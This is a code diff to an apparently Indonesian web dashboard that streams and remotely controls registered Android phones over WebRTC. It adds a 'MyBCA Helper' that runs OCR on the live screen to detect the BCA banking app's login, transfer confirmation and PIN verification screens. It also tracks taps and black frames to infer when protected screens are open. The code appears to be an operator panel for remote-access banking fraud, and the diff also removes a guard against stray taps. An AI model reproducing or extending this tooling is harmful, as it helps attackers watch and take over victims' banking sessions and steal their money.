@@ -346,7 +346,35 @@ tr:last-child td{border-bottom:0}
     .search{width:100%}
     .file-layout{grid-template-columns:1fr}
 }
+
+/* =====================================================
+   MYBCA HELPER
+===================================================== */
+.mybca-helper-card{
+    margin-top:14px;padding:14px;border:1px solid #26313d;border-radius:11px;
+    background:linear-gradient(180deg,#10171f,#0c1117);
+}
+.mybca-helper-head{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.mybca-helper-title{font-size:12px;font-weight:700;color:#e4e9ee}
+.mybca-helper-sub{font-size:10px;color:#748191;margin-top:4px}
+.mybca-helper-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:11px}
+.mybca-helper-stat{border:1px solid #202a35;border-radius:8px;padding:9px 10px;background:#0d131a}
+.mybca-helper-label{font-size:9px;color:#687585;text-transform:uppercase;letter-spacing:.5px}
+.mybca-helper-value{font-size:12px;color:#dce3e9;font-weight:700;margin-top:4px}
+.mybca-helper-actions{display:flex;gap:7px;margin-top:10px;flex-wrap:wrap}
+.mybca-helper-marker{
+    position:absolute;display:none;z-index:20;pointer-events:none;
+    border:2px solid #29d391;border-radius:8px;
+    box-shadow:0 0 0 4px #29d39122,0 0 18px #29d39155;
+}
+.mybca-helper-marker.show{display:block}
+.mybca-helper-marker span{
+    position:absolute;left:-2px;top:-25px;padding:4px 7px;border-radius:5px;
+    background:#29d391;color:#06110c;font-size:9px;font-weight:800;white-space:nowrap;
+}
+@media(max-width:700px){.mybca-helper-grid{grid-template-columns:1fr}.mybca-helper-head{align-items:flex-start;flex-direction:column}}
 </style>
+<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 </head>
 <body>
     
@@ -512,7 +540,8 @@ tr:last-child td{border-bottom:0}
     <div class="viewer">
         <div class="viewer-head">
             <div><div class="viewer-name" id="viewerName">Android Device</div><div class="viewer-sub" id="viewerSub">Waiting for WebRTC...</div></div>
-            <div style="display:flex;align-items:center;gap:12px">
+            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:flex-end">
+                <button class="btn small" type="button" onclick="refreshViewerStream()">↻ Refresh</button>
                 <div class="status" id="viewerStatus"></div>
                 <div class="status" id="controlStatus"><span class="dot"></span>Control Connecting</div>
             </div>
@@ -530,12 +559,29 @@ tr:last-child td{border-bottom:0}
             ></video>
             <div class="viewer-message" id="viewerMessage">Membuka koneksi WebRTC...<br><br>Live screen akan muncul di sini.</div>
         </div>
+        <div class="mybca-helper-card" id="mybcaHelperCard">
+            <div class="mybca-helper-head">
+                <div>
+                    <div class="mybca-helper-title">🏦 MyBCA Helper</div>
+                    <div class="mybca-helper-sub" id="mybcaHelperMessage">Menunggu live screen untuk mendeteksi tampilan.</div>
+                </div>
+                <div class="status" id="mybcaHelperStatus"><span class="dot"></span>Idle</div>
+            </div>
+            <div class="mybca-helper-grid">
+                <div class="mybca-helper-stat"><div class="mybca-helper-label">Bank</div><div class="mybca-helper-value" id="mybcaDetectedBank">—</div></div>
+                <div class="mybca-helper-stat"><div class="mybca-helper-label">State</div><div class="mybca-helper-value" id="mybcaDetectedState">—</div></div>
+                <div class="mybca-helper-stat"><div class="mybca-helper-label">OCR</div><div class="mybca-helper-value" id="mybcaOcrStatus">Idle</div></div>
+            </div>
+            <div class="mybca-helper-actions">
+                <button class="btn small" type="button" onclick="scanMyBcaNow()">⌕ Scan Sekarang</button>
+                <button class="btn small" type="button" onclick="resetMyBcaDetector()">↺ Reset Detector</button>
+            </div>
+        </div>
         <div class="viewer-hint">Klik layar = tap &nbsp;•&nbsp; Tarik = swipe &nbsp;•&nbsp; Gunakan tombol bawah untuk Back / Home / Recent</div>
         <div class="controls">
             <button class="btn" onclick="sendViewerCommand('back')">◀ Back</button>
             <button class="btn" onclick="sendViewerCommand('home')">● Home</button>
             <button class="btn" onclick="sendViewerCommand('recents')">▣ Recent</button>
-            <button class="btn" onclick="refreshViewerStream()">↻ Refresh</button>
             <button class="btn" onclick="takeViewerScreenshot()">▧ Screenshot</button>
             <button class="btn" onclick="toggleViewerFullscreen()">⛶ Fullscreen</button>
         </div>
@@ -559,6 +605,29 @@ let devices = [];
 let registrationRequests = [];
 let phoneTab = "registered";
 let selectedCategoryId = null;
+
+// =====================================================
+// MYBCA HELPER DETECTOR
+// =====================================================
+const myBcaDetector = {
+    bank: null,
+    state: null,
+    confidence: 0,
+    running: false,
+    scanning: false,
+    timer: null,
+    lastOcrText: "",
+    pendingSecureState: null,
+    lastTapAt: 0
+};
+
+const MYBCA_STATES = Object.freeze({
+    HOME: "HOME MYBCA",
+    LOGIN: "LOGIN MYBCA",
+    CONFIRMATION: "CONFIRMATION MYBCA",
+    PIN_VERIFICATION: "PIN_VERIFICATION MYBCA"
+});
+
 let categoryContextActive = false;
 let selectedDevice = null;
 let refreshTimer = null;
@@ -3014,8 +3083,243 @@ async function startCategoryPhoneStream(deviceId, isReconnect = false) {
 
 
 // =====================================================
+// MYBCA HELPER DETECTOR
+// =====================================================
+function updateMyBcaHelperUI(message = null) {
+    const bankEl = document.getElementById("mybcaDetectedBank");
+    const stateEl = document.getElementById("mybcaDetectedState");
+    const ocrEl = document.getElementById("mybcaOcrStatus");
+    const msgEl = document.getElementById("mybcaHelperMessage");
+    const statusEl = document.getElementById("mybcaHelperStatus");
+
+    if (bankEl) bankEl.textContent = myBcaDetector.bank || "—";
+    if (stateEl) stateEl.textContent = myBcaDetector.state || "—";
+    if (ocrEl) {
+        ocrEl.textContent = myBcaDetector.scanning
+            ? "Scanning..."
+            : (myBcaDetector.lastOcrText ? "Ready" : "Idle");
+    }
+    if (msgEl && message) msgEl.textContent = message;
+    if (statusEl) {
+        const active = !!myBcaDetector.bank;
+        statusEl.innerHTML = `<span class="dot ${active ? "online" : ""}"></span>${active ? "Detected" : "Idle"}`;
+    }
+}
+
+function setMyBcaState(state, confidence = 0.8, reason = "") {
+    myBcaDetector.bank = "MYBCA";
+    myBcaDetector.state = state;
+    myBcaDetector.confidence = confidence;
+    updateMyBcaHelperUI(reason || `Terdeteksi ${state}`);
+    console.log("[MyBCA Helper]", {bank: myBcaDetector.bank, state, confidence, reason});
+}
+
+function resetMyBcaDetector() {
+    myBcaDetector.bank = null;
+    myBcaDetector.state = null;
+    myBcaDetector.confidence = 0;
+    myBcaDetector.lastOcrText = "";
+    myBcaDetector.pendingSecureState = null;
+    updateMyBcaHelperUI("Detector di-reset.");
+}
+
+function normalizeOcrText(text) {
+    return String(text || "")
+        .toUpperCase()
+        .replace(/[|]/g, "I")
+        .replace(/[^A-Z0-9À-ÿ\s]/g, " ")
+        .replace(/\s+/g, " ")
+        .trim();
+}
+
+function myBcaHas(text, phrase) {
+    return text.includes(normalizeOcrText(phrase));
+}
+
+function detectMyBcaFromOcr(rawText) {
+    const text = normalizeOcrText(rawText);
+    myBcaDetector.lastOcrText = text;
+
+    // PIN screen: this is intentionally checked first because it is the most specific.
+    if (myBcaHas(text, "PIN Transaksi") || (myBcaHas(text, "Verifikasi") && myBcaHas(text, "Silakan masukkan PIN"))) {
+        setMyBcaState(MYBCA_STATES.PIN_VERIFICATION, 0.98, "Teks PIN Transaksi terdeteksi.");
+        return MYBCA_STATES.PIN_VERIFICATION;
+    }
+
+    if (myBcaHas(text, "Konfirmasi") && (myBcaHas(text, "Rekening Tujuan") || myBcaHas(text, "Nominal Tujuan"))) {
+        setMyBcaState(MYBCA_STATES.CONFIRMATION, 0.98, "Halaman Konfirmasi terdeteksi.");
+        return MYBCA_STATES.CONFIRMATION;
+    }
+
+    if (myBcaHas(text, "Password") && (myBcaHas(text, "Reset Password") || myBcaHas(text, "Masuk"))) {
+        setMyBcaState(MYBCA_STATES.LOGIN, 0.96, "Field Password myBCA terdeteksi.");
+        return MYBCA_STATES.LOGIN;
+    }
+
+    if (myBcaHas(text, "myBCA") && myBcaHas(text, "Masuk")) {
+        setMyBcaState(MYBCA_STATES.HOME, 0.98, "Halaman utama myBCA terdeteksi.");
+        return MYBCA_STATES.HOME;
+    }
+
+    // We may still know the bank from an earlier scan even when OCR is imperfect.
+    if (myBcaHas(text, "myBCA")) {
+        myBcaDetector.bank = "MYBCA";
+        updateMyBcaHelperUI("Aplikasi myBCA terdeteksi; state belum cukup spesifik.");
+    }
+
+    return null;
+}
+
+function getMyBcaOcrCanvas() {
+    const video = document.getElementById("phoneVideo");
+    if (!video || !video.videoWidth || !video.videoHeight) return null;
+
+    const canvas = document.createElement("canvas");
+    // Keep OCR reasonably light while preserving enough detail for the text labels.
+    const scale = Math.min(1, 900 / video.videoWidth);
+    canvas.width = Math.max(1, Math.round(video.videoWidth * scale));
+    canvas.height = Math.max(1, Math.round(video.videoHeight * scale));
+    const ctx = canvas.getContext("2d", {willReadFrequently: true});
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas;
+}
+
+async function ensureMyBcaOcrLoaded() {
+    if (window.Tesseract) return true;
+    updateMyBcaHelperUI("Memuat OCR engine...");
+    return false;
+}
+
+async function scanMyBcaNow() {
+    const video = document.getElementById("phoneVideo");
+    if (!video || !video.videoWidth || video.readyState < 2) {
+        updateMyBcaHelperUI("Live screen belum siap untuk di-scan.");
+        return null;
+    }
+
+    if (myBcaDetector.scanning) return null;
+    if (!(await ensureMyBcaOcrLoaded())) {
+        updateMyBcaHelperUI("OCR engine belum tersedia. Pastikan internet aktif pada dashboard.");
+        return null;
+    }
+
+    const canvas = getMyBcaOcrCanvas();
+    if (!canvas) return null;
+
+    myBcaDetector.scanning = true;
+    updateMyBcaHelperUI("Membaca tampilan live...");
+
+    try {
+        const result = await Tesseract.recognize(canvas, "eng", {
+            logger: info => {
+                if (info?.status === "recognizing text" && Number.isFinite(info.progress)) {
+                    const pct = Math.round(info.progress * 100);
+                    const ocrEl = document.getElementById("mybcaOcrStatus");
+                    if (ocrEl) ocrEl.textContent = `${pct}%`;
+                }
+            }
+        });
+
+        const text = result?.data?.text || "";
+        console.log("[MyBCA Helper] OCR:", text);
+        return detectMyBcaFromOcr(text);
+    } catch (error) {
+        console.error("[MyBCA Helper] OCR error:", error);
+        updateMyBcaHelperUI("OCR gagal membaca frame ini.");
+        return null;
+    } finally {
+        myBcaDetector.scanning = false;
+        updateMyBcaHelperUI();
+    }
+}
+
+function startMyBcaDetector() {
+    stopMyBcaDetector();
+    myBcaDetector.running = true;
+    startMyBcaBlackFrameWatcher();
+    updateMyBcaHelperUI("Menunggu frame live...");
+
+    const tick = async () => {
+        if (!myBcaDetector.running) return;
+        await scanMyBcaNow();
+        if (!myBcaDetector.running) return;
+        myBcaDetector.timer = setTimeout(tick, 3000);
+    };
+
+    myBcaDetector.timer = setTimeout(tick, 1200);
+}
+
+function stopMyBcaDetector() {
+    myBcaDetector.running = false;
+    stopMyBcaBlackFrameWatcher();
+    if (myBcaDetector.timer) {
+        clearTimeout(myBcaDetector.timer);
+        myBcaDetector.timer = null;
+    }
+    myBcaDetector.scanning = false;
+}
+
+function myBcaObserveTap(x, y) {
+    const now = Date.now();
+    myBcaDetector.lastTapAt = now;
+
+    // Secure-screen fallback. We do not read password/PIN content.
+    // If the known state is HOME and the tap is in the lower login-button zone,
+    // remember that the next secure frame is expected to be the myBCA login screen.
+    if (myBcaDetector.state === MYBCA_STATES.HOME && y >= 1150) {
+        myBcaDetector.pendingSecureState = MYBCA_STATES.LOGIN;
+        updateMyBcaHelperUI("Aksi Masuk terdeteksi; menunggu halaman Login myBCA.");
+    }
+
+    // If we are on the confirmation page and the user taps the lower Lanjut area,
+    // the next secure page is expected to be PIN verification.
+    if (myBcaDetector.state === MYBCA_STATES.CONFIRMATION && y >= 1200) {
+        myBcaDetector.pendingSecureState = MYBCA_STATES.PIN_VERIFICATION;
+        updateMyBcaHelperUI("Aksi Lanjut terdeteksi; menunggu Verifikasi PIN myBCA.");
+    }
+}
+
+function myBcaObserveSecureBlackFrame() {
+    if (!myBcaDetector.pendingSecureState) return;
+    const pending = myBcaDetector.pendingSecureState;
+    myBcaDetector.pendingSecureState = null;
+    setMyBcaState(pending, 0.75, "State dipertahankan dari alur sebelum layar terproteksi.");
+}
+
+// =====================================================
 // VIEWER
 // =====================================================
+
+async function refreshViewerStream() {
+    const deviceId = selectedDevice?.id;
+    if (!deviceId) {
+        showToast("Belum ada phone yang dibuka.");
+        return;
+    }
+
+    const button = document.querySelector('button[onclick="refreshViewerStream()"]');
+    if (button) {
+        button.disabled = true;
+        button.textContent = "↻ Refreshing...";
+    }
+
+    try {
+        stopViewerStream({keepAutoReconnect: false});
+        resetMyBcaDetector();
+        await new Promise(resolve => setTimeout(resolve, 250));
+        await startViewerStream(deviceId);
+        startMyBcaDetector();
+        showToast("Viewer berhasil di-refresh.");
+    } catch (error) {
+        console.error("[Viewer] refresh:", error);
+        showToast("Refresh viewer gagal.");
+    } finally {
+        if (button) {
+            button.disabled = false;
+            button.textContent = "↻ Refresh";
+        }
+    }
+}
 
 function openViewer(id) {
 
@@ -3068,7 +3372,9 @@ function openViewerUnlocked(device) {
         ${device.online ? "Online" : "Offline"}
     `;
 
+    resetMyBcaDetector();
     startViewerStream(device.id);
+    startMyBcaDetector();
 }
 
 
@@ -3588,8 +3894,6 @@ async function startViewerStream(deviceId) {
 
                 video.srcObject =
                     stream;
-
-                watchViewerFirstFrame(video);
 
                 video.controls = false;
                 video.classList.add(
@@ -4336,11 +4640,8 @@ function setupViewerScreenInput() {
         }
 
         event.preventDefault();
-        const point = getViewerAndroidPoint(event, video);
-        if (!point) return;
-
         viewerPointerId = event.pointerId;
-        viewerPointerStart = point;
+        viewerPointerStart = getViewerAndroidPoint(event, video);
         try { video.setPointerCapture(event.pointerId); } catch (_) {}
     }, { passive: false });
 
@@ -4350,16 +4651,10 @@ function setupViewerScreenInput() {
 
         const start = viewerPointerStart;
         const end = getViewerAndroidPoint(event, video);
-        if (!end) {
-            viewerPointerStart = null;
-            viewerPointerId = null;
-            try { video.releasePointerCapture(event.pointerId); } catch (_) {}
-            return;
-        }
-
         const distance = Math.hypot(end.x - start.x, end.y - start.y);
 
         if (distance < 18) {
+            myBcaObserveTap(Math.round(end.x), Math.round(end.y));
             sendViewerInput({
                 type: "tap",
                 x: Math.round(end.x),
@@ -4391,63 +4686,60 @@ function setupViewerScreenInput() {
 }
 
 function getViewerAndroidPoint(event, video) {
-    // Map pointer coordinates against the ACTUAL visible video content.
-    // The <video> element has a border and uses object-fit: contain, so using
-    // the raw bounding rectangle can introduce an offset. getBoundingClientRect
-    // is viewport-relative, which matches PointerEvent.clientX/clientY.
     const rect = video.getBoundingClientRect();
-    const styles = window.getComputedStyle(video);
-
-    const borderLeft = parseFloat(styles.borderLeftWidth) || 0;
-    const borderRight = parseFloat(styles.borderRightWidth) || 0;
-    const borderTop = parseFloat(styles.borderTopWidth) || 0;
-    const borderBottom = parseFloat(styles.borderBottomWidth) || 0;
-
-    const contentLeft = rect.left + borderLeft;
-    const contentTop = rect.top + borderTop;
-    const contentWidth = Math.max(1, rect.width - borderLeft - borderRight);
-    const contentHeight = Math.max(1, rect.height - borderTop - borderBottom);
-
     const width = video.videoWidth || 720;
     const height = video.videoHeight || 1600;
-
-    // The stream is portrait 720x1600. Calculate the exact displayed media
-    // rectangle inside the video content box, matching object-fit: contain.
     const videoRatio = width / height;
-    const boxRatio = contentWidth / contentHeight;
+    const boxRatio = rect.width / rect.height;
 
-    let renderedWidth = contentWidth;
-    let renderedHeight = contentHeight;
+    let renderedWidth = rect.width;
+    let renderedHeight = rect.height;
     let offsetX = 0;
     let offsetY = 0;
 
     if (boxRatio > videoRatio) {
-        renderedHeight = contentHeight;
-        renderedWidth = renderedHeight * videoRatio;
-        offsetX = (contentWidth - renderedWidth) / 2;
+        renderedWidth = rect.height * videoRatio;
+        offsetX = (rect.width - renderedWidth) / 2;
     } else {
-        renderedWidth = contentWidth;
-        renderedHeight = renderedWidth / videoRatio;
-        offsetY = (contentHeight - renderedHeight) / 2;
-    }
-
-    const localX = event.clientX - contentLeft - offsetX;
-    const localY = event.clientY - contentTop - offsetY;
-
-    // Never turn a click on the frame/letterbox area into a phone tap.
-    if (
-        localX < 0 ||
-        localY < 0 ||
-        localX > renderedWidth ||
-        localY > renderedHeight
-    ) {
-        return null;
+        renderedHeight = rect.width / videoRatio;
+        offsetY = (rect.height - renderedHeight) / 2;
     }
 
     return {
-        x: Math.max(0, Math.min(width, (localX / renderedWidth) * width)),
-        y: Math.max(0, Math.min(height, (localY / renderedHeight) * height))
+        x: Math.max(0, Math.min(width, ((event.clientX - rect.left - offsetX) / renderedWidth) * width)),
+        y: Math.max(0, Math.min(height, ((event.clientY - rect.top - offsetY) / renderedHeight) * height))
     };
+}
+
+let myBcaBlackFrameTimer = null;
+
+function startMyBcaBlackFrameWatcher() {
+    if (myBcaBlackFrameTimer) clearInterval(myBcaBlackFrameTimer);
+    myBcaBlackFrameTimer = setInterval(() => {
+        if (!myBcaDetector.running || !myBcaDetector.pendingSecureState) return;
+        const video = document.getElementById("phoneVideo");
+        if (!video || !video.videoWidth || !video.videoHeight || video.readyState < 2) return;
+
+        const canvas = document.createElement("canvas");
+        canvas.width = 32;
+        canvas.height = 32;
+        const ctx = canvas.getContext("2d", {willReadFrequently:true});
+        ctx.drawImage(video, 0, 0, 32, 32);
+        const data = ctx.getImageData(0, 0, 32, 32).data;
+        let sum = 0;
+        for (let i = 0; i < data.length; i += 4) {
+            sum += (data[i] + data[i+1] + data[i+2]) / 3;
+        }
+        const avg = sum / (data.length / 4);
+        if (avg < 8) myBcaObserveSecureBlackFrame();
+    }, 500);
+}
+
+function stopMyBcaBlackFrameWatcher() {
+    if (myBcaBlackFrameTimer) {
+        clearInterval(myBcaBlackFrameTimer);
+        myBcaBlackFrameTimer = null;
+    }
 }
 
 function syncViewerDeviceName(deviceId = null) {
@@ -4490,78 +4782,6 @@ function sendViewerInput(payload) {
     }
 }
 
-async function refreshViewerStream() {
-    const deviceId = selectedDevice?.id;
-    if (!deviceId) {
-        showToast("Phone belum dipilih.");
-        return;
-    }
-
-    const button = Array.from(document.querySelectorAll(".controls .btn"))
-        .find(el => el.textContent.includes("Refresh"));
-
-    if (button) {
-        button.disabled = true;
-        button.classList.add("spinning");
-    }
-
-    try {
-        stopViewerStream({ keepAutoReconnect: true });
-
-        const video = document.getElementById("phoneVideo");
-        const message = document.getElementById("viewerMessage");
-        if (video) {
-            video.classList.remove("active");
-            video.srcObject = null;
-        }
-        if (message) {
-            message.style.display = "block";
-            message.innerHTML = "Memuat ulang live screen...";
-        }
-
-        await new Promise(resolve => setTimeout(resolve, 120));
-        await startViewerStream(deviceId);
-        showToast("Live screen sedang di-refresh.");
-    } catch (error) {
-        console.error("[Viewer] refresh stream:", error);
-        showToast("Gagal refresh live screen.");
-    } finally {
-        if (button) {
-            button.disabled = false;
-            button.classList.remove("spinning");
-        }
-    }
-}
-
-function watchViewerFirstFrame(video) {
-    if (!video) return;
-
-    // A remote WebRTC track can exist before the first decoded frame is
-    // actually presented. Track the first real frame so the UI does not
-    // pretend that a black video is already live.
-    const markFirstFrame = () => {
-        video.dataset.hasDecodedFrame = "1";
-        video.classList.add("active");
-        const message = document.getElementById("viewerMessage");
-        if (message) message.style.display = "none";
-    };
-
-    video.dataset.hasDecodedFrame = "0";
-
-    if ("requestVideoFrameCallback" in HTMLVideoElement.prototype) {
-        const checkFrame = () => {
-            if (video.videoWidth > 0 && video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA) {
-                markFirstFrame();
-                return;
-            }
-            video.requestVideoFrameCallback(checkFrame);
-        };
-        video.requestVideoFrameCallback(checkFrame);
-    } else {
-        video.addEventListener("playing", markFirstFrame, { once: true });
-    }
-}
-
 function takeViewerScreenshot() {
     const video = document.getElementById("phoneVideo");
     if (!video || !video.videoWidth || !video.videoHeight) {
@@ -4599,6 +4819,8 @@ async function toggleViewerFullscreen() {
 
 
 function stopViewerStream(options = {}) {
+
+    stopMyBcaDetector();
 
     if (!options.keepAutoReconnect) {
         viewerAutoReconnectEnabled = false;
